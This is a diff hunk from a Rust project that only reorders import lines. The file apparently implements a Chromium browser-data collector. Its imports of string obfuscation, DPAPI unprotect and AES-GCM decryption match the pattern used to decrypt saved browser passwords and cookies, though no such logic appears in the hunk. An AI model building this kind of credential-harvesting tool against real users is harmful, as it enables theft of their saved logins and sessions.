@@ -23,19 +23,19 @@ use core::ffi::c_void;
 use core::mem::zeroed;
 use core::ptr::null_mut;
 use core::slice;
+use filesystem::FileSystem;
 use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
-use filesystem::FileSystem;
 use json::parse;
 use obfstr::obfstr as s;
-use tasks::{composite_task, CompositeTask, Task};
+use tasks::{CompositeTask, Task, composite_task};
 use utils::base64::base64_decode_string;
 use windows_sys::Win32::Foundation::LocalFree;
 use windows_sys::Win32::Security::Cryptography::{
-    BCryptCloseAlgorithmProvider, BCryptDecrypt, BCryptDestroyKey,
-    BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider, BCryptSetProperty, CryptUnprotectData,
-    BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO, BCRYPT_CHAINING_MODE,
-    BCRYPT_CHAIN_MODE_GCM, BCRYPT_KEY_HANDLE, CRYPT_INTEGER_BLOB,
+    BCRYPT_AES_ALGORITHM, BCRYPT_ALG_HANDLE, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO,
+    BCRYPT_CHAIN_MODE_GCM, BCRYPT_CHAINING_MODE, BCRYPT_KEY_HANDLE, BCryptCloseAlgorithmProvider,
+    BCryptDecrypt, BCryptDestroyKey, BCryptGenerateSymmetricKey, BCryptOpenAlgorithmProvider,
+    BCryptSetProperty, CRYPT_INTEGER_BLOB, CryptUnprotectData,
 };
 
 pub struct ChromiumTask<'a, C: Collector, F: FileSystem> {
